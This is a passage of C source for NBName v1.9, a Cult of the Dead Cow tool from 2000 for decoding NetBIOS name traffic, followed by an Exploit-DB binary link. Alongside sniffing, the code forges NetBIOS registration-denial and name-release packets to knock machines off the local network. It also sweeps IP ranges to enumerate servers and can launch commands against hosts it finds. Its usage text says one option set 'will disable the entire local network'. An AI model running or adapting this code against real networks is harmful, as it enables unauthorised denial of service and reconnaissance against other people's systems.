				d = FormPacket(outbuff, pnbnameheader->TransactionID, OPCODE_QUERY, NameBuff, QUESTION_TYPE_NB, TRUE, FALSE, FALSE, FALSE, TRUE, TRUE, 0, 0, 1, 0, 0, psockaddr->sin_addr.s_addr, 0, ONT_BNODE);



				sendto(sock, (const char *)outbuff, d, 0, (LPSOCKADDR)psockaddr, sizeof(SOCKADDR_IN) );



				printf(" **** QUERY from %s responded to for name: ", inet_ntoa(psockaddr->sin_addr));

				PrintNetbiosName((BYTE *)NameBuff);

				puts("");

			}

		}







		if (g_AllowName != NULL || g_DenyName != NULL)

		{

			if (OPCode == OPCODE_REGISTRATION && ntohs(pquestion->Type) == QUESTION_TYPE_NB)

			{

				BOOL DoDeny = FALSE;



				if (g_DenyName != NULL)

				{

					DoDeny = TRUE;

					if (strncmp(g_DenyName, "*", 1) == 0 || STRNICMP(NameBuff, g_DenyName, strlen(g_DenyName)) == 0)

						DoDeny = FALSE;

					else if (access(g_DenyName, 4) == 0)

					{

						FILE *InFile = fopen(g_DenyName, "rt");

						char namecheckbuff[1024];



						if (InFile == NULL)

						{

							printf(" **** Unable to open %s\n", g_DenyName);

							DoDeny = FALSE;

						}

						else

						{

							while (DoDeny == TRUE && fgets(namecheckbuff, 1024, InFile) != NULL)

							{

								char *p = strchr(namecheckbuff, '\n');

								if (p) *p = 0;



								if (STRNICMP(namecheckbuff, NameBuff, strlen(namecheckbuff)) == 0)

									DoDeny = FALSE;

							}



							fclose(InFile);

						}

					}





				}



				if (g_AllowName != NULL)

				{

					DoDeny = FALSE;



					if (STRNICMP(NameBuff, g_AllowName, strlen(g_AllowName)) == 0)

						DoDeny = TRUE;

					else if (access(g_AllowName, 4) == 0)

					{

						FILE *InFile = fopen(g_AllowName, "rt");

						char namecheckbuff[1024];



						if (InFile == NULL)

							printf(" **** Unable to open %s\n", g_AllowName);

						else

						{

							while (DoDeny == FALSE && fgets(namecheckbuff, 1024, InFile) != NULL)

							{

								char *p = strchr(namecheckbuff, '\n');

								if (p) *p = 0;



								if (STRNICMP(namecheckbuff, NameBuff, strlen(namecheckbuff)) == 0)

									DoDeny = TRUE;

							}



							fclose(InFile);

						}

					}

				}



				BYTE outbuff[1024];

				WORD Rcode;



				if (fRecursionDesired)

					Rcode = RCODE_CFTERR;

				else

					Rcode = RCODE_ACTERR;

					

				d = FormPacket(outbuff, pnbnameheader->TransactionID, OPCODE_REGISTRATION, NameBuff, QUESTION_TYPE_NB, TRUE, FALSE, FALSE, TRUE, TRUE, TRUE, Rcode, 0, 1, 0, 0, MAKELONG(rand(), rand()) , 0, ONT_BNODE);



				sendto(sock, (const char *)outbuff, d, 0, (LPSOCKADDR)psockaddr, sizeof(SOCKADDR_IN) );



				printf(" **** DENY packet sent\n");



			}

		}

	}



	for (w = 0; w < ANCount; w++)

	{

		printf("Answer[%d]:\n", w);



		d = ProcessResourceRecord(ptr, 1, sock, psockaddr, (char *)ptr - buff);



		if (d == 0) return 0;



		ptr+=d;

	}



	for (w = 0; w < NSCount; w++)

	{

		printf("Authority record[%d]:\n", w);



		d = ProcessResourceRecord(ptr, 2, sock, psockaddr, (char *)ptr - buff);



		if (d == 0) return 0;



		ptr+=d;

	}



	for (w = 0; w < ARCount; w++)

	{

		printf("Additional record[%d]:\n", w);



		d = ProcessResourceRecord(ptr, 3, sock, psockaddr, (char *)ptr - buff);



		if (d == 0) return 0;



		ptr+=d;

	}





	return 0;

}





#ifdef WIN32

void __cdecl ScanLoopThread(void *parg)

#else

void *ScanLoopThread(void *parg)

#endif

{

	FILE *infile = NULL;

	SOCKADDR_IN sockaddr;

	SOCKET udpsock = *((SOCKET *)parg);

	char buff[1024];

	unsigned char outbuff[1024];

	DWORD d;

	int retry;



	infile = fopen(g_ScanFile, "rt");



	if (infile == NULL)

	{

		printf(" ***** Error opening %s, scan aborted.\n", g_ScanFile);

	} else {



		d = FormPacket(outbuff, rand(), OPCODE_QUERY, WILDCARDNAME, QUESTION_TYPE_NBSTAT, FALSE, TRUE, FALSE, FALSE, FALSE, FALSE, 0, 1, 0, 0, 0, g_TargetIP, 0, ONT_BNODE);



		sockaddr.sin_family = AF_INET;

		sockaddr.sin_port = htons(NETBIOSNAMEPORT);







		while (fgets(buff, 1024, infile) != NULL)

		{

			if (strlen(buff))

			{

				char *p = strchr(buff, '\n');

				if (p) *p = 0;



				sockaddr.sin_addr.s_addr = inet_addr(buff) ;

			

				retry = 0;



				while ( retry <= g_Retries && sendto(udpsock, (const char *)outbuff, d, 0, (LPSOCKADDR)&sockaddr, sizeof(SOCKADDR_IN) ) == SOCKET_ERROR )

				{

					retry++;

					printf("Error %u sending to %s, Resending...\n", GETSOCKETERROR(), inet_ntoa(sockaddr.sin_addr) );

					SLEEP(500);

				}



				if (g_PacketDelay)

					SLEEP(g_PacketDelay);



			}

		}



		printf(" **** Scan done\n");



		fclose(infile);

	}



#ifdef WIN32

	EXITTHREAD();

#else

	return NULL;

#endif

}







#ifdef WIN32

void __cdecl SweepLoopThread(void *parg)

#else

void *SweepLoopThread(void *parg)

#endif

{

	DWORD CurrentIP = g_SweepStartIP;

	DWORD d;

	unsigned char outbuff[1024];

	SOCKADDR_IN sockaddr;

	SOCKET udpsock = *((SOCKET *)parg);

	int retry;



	d = FormPacket(outbuff, rand(), OPCODE_QUERY, WILDCARDNAME, QUESTION_TYPE_NBSTAT, FALSE, TRUE, FALSE, FALSE, FALSE, FALSE, 0, 1, 0, 0, 0, g_TargetIP, 0, ONT_BNODE);



	sockaddr.sin_family = AF_INET;

	sockaddr.sin_port = htons(NETBIOSNAMEPORT);

	

	while (htonl(CurrentIP) <= htonl(g_SweepEndIP))

	{

		sockaddr.sin_addr.s_addr = CurrentIP ;



		retry = 0;



		while ( retry <= g_Retries && sendto(udpsock, (const char *)outbuff, d, 0, (LPSOCKADDR)&sockaddr, sizeof(SOCKADDR_IN) ) == SOCKET_ERROR )

		{

			retry++;

			printf("Error %u sending to %s, Resending...\n", GETSOCKETERROR(), inet_ntoa(sockaddr.sin_addr) );

			SLEEP(500);

		}



		CurrentIP = ntohl(htonl(CurrentIP) + 1);	// increment IP



		if (g_PacketDelay)

			SLEEP(g_PacketDelay);

	} ;



	printf(" **** Sweep done\n");



	g_SweepEndIP = 0;



#ifdef WIN32

	EXITTHREAD();

#else

	return NULL;

#endif

}





DWORD DoLoop()

{

	BYTE buff[2046];

	BYTE inbuff[4096];

	SOCKADDR_IN sockaddr;

	HOSTENT *phostent;

	int x;

	BOOL b;

	DWORD d;

	unsigned char outbuff[1024];

	



	SOCKET udpsock = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);



	if (udpsock == INVALID_SOCKET)

	{

		printf("Error %d creating socket\n", GETSOCKETERROR() );

		return 0;

	}





	b = TRUE;

	if (setsockopt(udpsock, SOL_SOCKET, SO_REUSEADDR, (const char *)&b, sizeof(b) ) == SOCKET_ERROR)

	{

		printf("Error %d setting socket option SO_REUSEADDR\n", GETSOCKETERROR() );

		CLOSESOCKET(udpsock);

		return 0;

	}



	b = TRUE;

	if (setsockopt(udpsock, SOL_SOCKET, SO_BROADCAST, (const char *)&b, sizeof(b) ) == SOCKET_ERROR)

	{

		printf("Error %d setting socket option SO_BROADCAST\n", GETSOCKETERROR() );

		CLOSESOCKET(udpsock);

		return 0;

	}





	if (g_ReceiveTimeout)

	{

#ifdef WIN32

		if (setsockopt(udpsock, SOL_SOCKET, SO_RCVTIMEO, (const char *)&g_ReceiveTimeout, sizeof(g_ReceiveTimeout) ) == SOCKET_ERROR)

#else

		struct timeval tvstruct;

		tvstruct.tv_sec = g_ReceiveTimeout/1000;

		tvstruct.tv_usec = (g_ReceiveTimeout%1000)*1000;

		if (setsockopt(udpsock, SOL_SOCKET, SO_RCVTIMEO, (const char *)&tvstruct, sizeof(tvstruct) ) == SOCKET_ERROR)

#endif

		{

			printf("Error %d setting timeout to %d milliseconds\n", GETSOCKETERROR(), g_ReceiveTimeout );

		}

	}





	if (g_LocalIP == INADDR_NONE)

	{

		if (gethostname((char *)buff, sizeof(buff) ) == SOCKET_ERROR)

		{

			printf("Error %d getting local host name\n", GETSOCKETERROR() );

			CLOSESOCKET(udpsock);

			return 0;

		}



		phostent = gethostbyname((char *)buff);



		if (phostent == NULL)

		{

			printf("Error %d getting local address for name %s\n", GETSOCKETERROR(), buff );

			CLOSESOCKET(udpsock);

			return 0;

		}

		g_LocalIP = ((struct in_addr *) phostent->h_addr)->s_addr;

	}



	sockaddr.sin_addr.s_addr = g_LocalIP;

	sockaddr.sin_port = htons(g_LocalPort);

	sockaddr.sin_family = AF_INET;



	if (bind(udpsock, (LPSOCKADDR)&sockaddr, sizeof(sockaddr) ) == SOCKET_ERROR)

	{

		d = GETSOCKETERROR();

		printf("Error %u binding to port %d at address %s\n", d, g_LocalPort, inet_ntoa(sockaddr.sin_addr) );

		CLOSESOCKET(udpsock);

		return 0;

	} else {

		printf("Bound to port %d on address %s\n", g_LocalPort, inet_ntoa(sockaddr.sin_addr) );

	}



	sockaddr.sin_port = htons(NETBIOSNAMEPORT);



#ifdef WINSOCK2 

	INTERFACE_INFO ifaceinfo[50];



	if (WSAIoctl(udpsock, SIO_GET_INTERFACE_LIST, NULL, 0, &ifaceinfo, sizeof(ifaceinfo) * sizeof(INTERFACE_INFO), &d, NULL, NULL ) == SOCKET_ERROR )

	{

		printf("Error %u getting interface list, using INADDR_BROADCAST\n", WSAGetLastError() );

	} else {

		for (x = 0; x < (int)(d / sizeof(INTERFACE_INFO)); x++)

		{

			if (g_LocalIP == ifaceinfo[x].iiAddress.AddressIn.sin_addr.s_addr )

			{

				g_BroadcastIP = g_LocalIP | ~ifaceinfo[x].iiNetmask.AddressIn.sin_addr.s_addr;

				if (g_NetmaskIP == 0)

					g_NetmaskIP = ifaceinfo[x].iiNetmask.AddressIn.sin_addr.s_addr;

				break;

			}

		}

		if (x == (int)(d / sizeof(INTERFACE_INFO)))

		{

			printf("Unable to find interface %s, using INADDR_BROADCAST\n", inet_ntoa(sockaddr.sin_addr) );

		}

	}

#endif



	if (g_NetmaskIP == 0)

		g_NetmaskIP = MAKELONG(MAKEWORD(255, 255), MAKEWORD(255, 0) );





	{

		struct in_addr bcastadr, nmaskadr;



		bcastadr.s_addr = g_BroadcastIP;

		nmaskadr.s_addr = g_NetmaskIP;



		printf("Broadcast address: %s        ", inet_ntoa(bcastadr));

		printf("Netmask: %s\n", inet_ntoa(nmaskadr) );

	}

	



	if (g_FindAll)

	{

		sockaddr.sin_addr.s_addr = g_BroadcastIP;	

		sockaddr.sin_port = htons(NETBIOSNAMEPORT);



		d = FormPacket(outbuff, rand(), OPCODE_QUERY, WILDCARDNAME, QUESTION_TYPE_NB, FALSE, TRUE, FALSE, FALSE, FALSE, FALSE, 0, 1, 0,	0, 0, 0, 0, ONT_BNODE);



		sendto(udpsock, (const char *)outbuff, d, 0, (LPSOCKADDR)&sockaddr, sizeof(SOCKADDR_IN) );



		printf(" **** Wildcard NB QUERY packet broadcast\n");

	}





	if ((g_Astat ) && g_TargetIP != INADDR_NONE)

	{

		d = FormPacket(outbuff, rand(), OPCODE_QUERY, WILDCARDNAME, QUESTION_TYPE_NBSTAT, FALSE, TRUE, FALSE, FALSE, FALSE, FALSE, 0, 1, 0, 0, 0, g_TargetIP, 0, ONT_BNODE);



		sockaddr.sin_addr.s_addr = g_TargetIP ;

		sendto(udpsock, (const char *)outbuff, d, 0, (LPSOCKADDR)&sockaddr, sizeof(SOCKADDR_IN) );



		printf(" **** NBSTAT QUERY packet sent to %s\n", inet_ntoa(sockaddr.sin_addr));

	}



	if (htonl(g_SweepEndIP) >= htonl(g_SweepStartIP) && g_SweepStartIP != 0 && g_SweepEndIP != 0)

	{

		printf(" **** Beginning sweep...\n");



#ifdef WIN32

		CREATETHREAD(SweepLoopThread, &udpsock);

#else

		if (fork() == 0)

		{

			SweepLoopThread(&udpsock);

			exit(0);

		}

#endif

	}



	if (g_ScanFile != NULL )

	{

		if (access(g_ScanFile, 4) != 0)

		{

			printf("Unable to access %s\n", g_ScanFile);

		} else {

			printf(" **** Beginning scan of IPs in %s...\n", g_ScanFile);



#ifdef WIN32

			CREATETHREAD(ScanLoopThread, &udpsock);

#else

			if (fork() == 0)

			{

				ScanLoopThread(&udpsock);

				exit(0);

			}

#endif

		}



	}



	puts("");



	do

	{

#ifdef WIN32

		int size = sizeof(sockaddr);

#else

		socklen_t size = sizeof(sockaddr);

#endif

		x = recvfrom(udpsock, (char *)inbuff, sizeof(inbuff), 0, (LPSOCKADDR)&sockaddr, &size);

		if (x > 0)

		{

			if (!(g_NoLocal && sockaddr.sin_addr.s_addr == g_LocalIP)  && !(g_NoLocalNet && (sockaddr.sin_addr.s_addr & g_NetmaskIP) == (g_LocalIP & g_NetmaskIP)) )

			{

				time_t curtime = time(NULL);

				printf("**  Received %d bytes from %s:%d at %s", x, inet_ntoa(sockaddr.sin_addr), ntohs(sockaddr.sin_port), ctime(&curtime) );

				ProcessPacket((char *)inbuff, x, udpsock, &sockaddr);

				puts("");

			}

		}

	} while (g_SweepEndIP != 0 || x > 0);



	CLOSESOCKET(udpsock);



	return 0;

}





void Usage()

{

	puts(" Usage: NBName [/FINDALL] [/CONFLICT] [/REVERSE] [/NOLOCAL|/NOLOCALNET]");

	puts("         [/ASTAT TargetIP] [/SWEEP StartIP EndIP] [/SCAN IPList]");

	puts("         [/TO ms] [/DELAY ms] [/PORT Port] [/RETRY Trys] ");

	puts("         [/LOCALIP LocalIP] [/NETMASK Netmask] [/EXAMPLES]");

	puts("         [/ALLOW|/DENY NameOrFile] [/RESPOND NameOrFile]");

	puts("         [/OUTSERVS|/OUTALL OutFile] [/ASOUT Outfile]  [/SPAWN CmdExe \"Args\"]");

	puts("   /LOCALIP will bind to LocalIP instead of the default system IP");

	puts("   /NETMASK will use Netmask to determine local net addresses");

	puts("   /PORT will bind to Port instead of 137");

	puts("   /FINDALL causes a general name query to be broadcast and adapter status");

	puts("      (astat) request packets to be sent to all machines that respond ");

	puts("   /ASTAT will send an adapter status (astat) request to TargetIP");

	puts("   /SWEEP will send adapter status requests to all IPs from StartIP to EndIP");

	puts("   /SCAN will send adapter status requests to each IP listed in IPList");

	puts("   /DELAY will pause for ms milliseconds between each packet sent durring a");

	puts("      scan or sweep, default 100 ms (10 packets per second)");

	puts("   /REVERSE will send an astat request in response to astat requests");

	puts("   /ASOUT will output received adapter status responses' contents to Outfile");

	puts("   /OUTSERVS will output machines that respond to an adapter status request");

	puts("      and have the server service running to OutFile in the format of lmhosts");

	puts("   /OUTALL will output all machines that respond, even workstations");

	puts("   /SPAWN will spawn CmdExe with the commandline: CmdExe Args SrvrIP SrvrName");

	puts("      when an astat response is received with the server service running");

	puts("   /NOLOCAL will prevent packets from the local host from being processed");

	puts("   /NOLOCALNET will prevent packets from the local subnet from being processed");

	puts("   /TO causes NBName to exit if no packets are received for ms milliseconds");

	puts("   /RESPOND will respomd to requests for NameOrFile");

	puts("   /DENY* will cause the name(s) specified by NameOrFile to be denied if a");

	puts("      node tries to register it (them)");

	puts("   /ALLOW* will deny all names _except_ NameOrFile");

	puts("      NameOrFile can be a single name, the path to a file containing a list of");

	puts("      names or * for all names (/ALLOW * is not valid), names should be in CAPS");

	puts("   /CONFLICT* will send name release packets for each name in the remote name ");

	puts("      table of machines who respond to adapter status requests ");

	puts("   /RETRY changes the number of times failed packets are resent from 3 to Trys");

	puts("  *  These options may be damaging to network stability, use with caution!");

	puts(" Clowns are evil, legacy protocols are a problem, Las Vegas is run by gnomes");

}



void Examples()

{

	puts("  /ALLOW and /DENY will effectively keep machines from being able to join the");

	puts("	  NetBIOS network because they will always think their machine name is");

	puts("    in use");

	puts("  /CONFLICT will cause machines to stop responding to their NetBIOS names, ");

	puts("    which will become in conflict and the NetBIOS networking will stop working");

	puts("  NBNAME /FINDALL /NOBOOTY /DENY * will disable the entire local network ");

	puts("    and prevent machines from reaccessing the NetBIOS network while running");

	puts("  NBNAME /NOLOCAL /REVERSE /CONFLICT will release the names of any machine that");

	puts("    requests adapter status from your machine");

	puts("  NBNAME /SWEEP 10.10.10.1 10.10.12.255 /DELAY 3 /NOLOCALNET /OUTSERVS lmhosts");

	puts("    will sweep three class C networks with astat requests and machines ");

	puts("    that respond and have the server service running will be added to lmhosts");

}





int main(int argc, char* argv[])

{

	int x;



	puts("NBName v1.9 - Decodes and displays NetBIOS Name traffic (UDP 137), with options");

	puts(" Copyright 2000: Sir Dystic, Cult of the Dead Cow  -:|:-  New Hack City");

	puts(" Send complaints, ideas and donations to sd@cultdeadcow.com|sd@newhackcity.net\n");





	for (x = 1; x < argc; x++)

	{

		if (argv[x][0] == '/')

		{

			if (STRICMP(argv[x], "/CONFLICT") == 0)

				g_Conflict = TRUE;

			else if (STRICMP(argv[x], "/FINDALL") == 0)

				g_FindAll = TRUE;

			else if (STRICMP(argv[x], "/NOLOCAL") == 0)

				g_NoLocal = TRUE;

			else if (STRICMP(argv[x], "/REVERSE") == 0)

				g_Reverse = TRUE;

			else if (STRICMP(argv[x], "/NOLOCALNET") == 0)

				g_NoLocalNet = TRUE;

			else if (STRICMP(argv[x], "/ASTAT") == 0)

			{

				if (x > argc - 2)

				{

					printf("Missing argument for /ASTAT\n");

					Usage();

					return 0;

				}

				g_Astat = TRUE;

				x++;

				g_TargetIP = inet_addr(argv[x]);

			}

			else if (STRICMP(argv[x], "/SPAWN") == 0)

			{

				if (x > argc - 3)

				{

					printf("Missing argument for /SPAWN\n");

					Usage();

					return 0;

				}

				x++;

				g_SpawnCommand = argv[x];

				x++;

				g_SpawnArgs = argv[x];

			}

			else if (STRICMP(argv[x], "/ASOUT") == 0)

			{

				if (x > argc - 2)

				{

					printf("Missing argument for /ASOUT\n");

					Usage();

					return 0;

				}

				x++;

				g_ASOutFile = argv[x];

			}

			else if (STRICMP(argv[x], "/ALLOW") == 0)

			{

				if (x > argc - 2)

				{

					printf("Missing argument for /ALLOW\n");

					Usage();

					return 0;

				}

				x++;

				g_AllowName = argv[x];

			}

			else if (STRICMP(argv[x], "/DENY") == 0)

			{

				if (x > argc - 2)

				{

					printf("Missing argument for /DENY\n");

					Usage();

					return 0;

				}

				x++;

				g_DenyName = argv[x];

			}

			else if (STRICMP(argv[x], "/RESPOND") == 0)

			{

				if (x > argc - 2)

				{

					printf("Missing argument for /RESPOND\n");

					Usage();

					return 0;

				}

				x++;

				g_RespondName = argv[x];

			}



			else if (STRICMP(argv[x], "/SCAN") == 0)

			{

				if (x > argc - 2)

				{

					printf("Missing argument for /SCAN\n");

					Usage();

					return 0;

				}

				x++;

				g_ScanFile = argv[x];

			}

			else if (STRICMP(argv[x], "/TO") == 0)

			{

				if (x > argc - 2)

				{

					printf("Missing argument for /TO\n");

					Usage();

					return 0;

				}

				x++;

				g_ReceiveTimeout = atoi(argv[x]);

			}

			else if (STRICMP(argv[x], "/RETRY") == 0)

			{

				if (x > argc - 2)

				{

					printf("Missing argument for /RETRY\n");

					Usage();

					return 0;

				}

				x++;

				g_Retries = atoi(argv[x]);

			}

			else if (STRICMP(argv[x], "/DELAY") == 0)

			{

				if (x > argc - 2)

				{

					printf("Missing argument for /DELAY\n");

					Usage();

					return 0;

				}

				x++;

				g_PacketDelay = atoi(argv[x]);

			}

			else if (STRICMP(argv[x], "/PORT") == 0)

			{

				if (x > argc - 2)

				{

					printf("Missing argument for /PORT\n");

					Usage();

					return 0;

				}

				x++;

				g_LocalPort = atoi(argv[x]);

			}

			else if (STRICMP(argv[x], "/OUTSERVS") == 0)

			{

				if (x > argc - 2)

				{

					printf("Missing argument for /OUTSERVS\n");

					Usage();

					return 0;

				}

				x++;

				g_OutServsFile = argv[x];

			}

			else if (STRICMP(argv[x], "/OUTALL") == 0)

			{

				if (x > argc - 2)

				{

					printf("Missing argument for /OUTALL\n");

					Usage();

					return 0;

				}

				x++;

				g_OutAllFile = argv[x];

			}

			else if (STRICMP(argv[x], "/SWEEP") == 0)

			{

				if (x > argc - 3)

				{

					printf("Missing argument for /SWEEP\n");

					Usage();

					return 0;

				}

				x++;

				g_SweepStartIP = inet_addr(argv[x]);

				x++;

				g_SweepEndIP = inet_addr(argv[x]);

			}

			else if (STRICMP(argv[x], "/EXAMPLES") == 0)

				Examples();

			else if (STRICMP(argv[x], "/LOCALIP") == 0)

			{

				if (x > argc - 2)

				{

					printf("Missing argument for /LOCALIP\n");

					Usage();

					return 0;

				}

				x++;

				g_LocalIP = inet_addr(argv[x]);

			}

			else if (STRICMP(argv[x], "/NETMASK") == 0)

			{

				if (x > argc - 2)

				{

					printf("Missing argument for /NETMASK\n");

					Usage();

					return 0;

				}

				g_Astat = TRUE;

				x++;

				g_NetmaskIP = inet_addr(argv[x]);

			}

			else

			{

				printf("Bad option: \"%s\"\n", argv[x] );

				Usage();

				return 0;

			}

		}

		else

		{

			printf("Bad argument: \"%s\"\n", argv[x] );

			Usage();

			return 0;

		}

	}



#ifdef WIN32

	WSADATA wsadata;



#ifdef WINSOCK2

	WSAStartup(MAKEWORD(2,0), &wsadata);

#else

	WSAStartup(MAKEWORD(1,1), &wsadata);

#endif



	printf("WinSock v%d.%d (v%d.%d)  %s\n", LOBYTE(wsadata.wVersion), HIBYTE(wsadata.wVersion), LOBYTE(wsadata.wHighVersion), HIBYTE(wsadata.wHighVersion), wsadata.szDescription );





	if (strlen(wsadata.szSystemStatus))

		printf("WinSock status:  %s\n", wsadata.szSystemStatus);

#endif



	srand(GETRANDSEED());



	DoLoop();



#ifdef WIN32

	WSACleanup();

#endif

	return 0;

}


https://github.com/offensive-security/exploit-database-bin-sploits/raw/master/sploits/20106.exe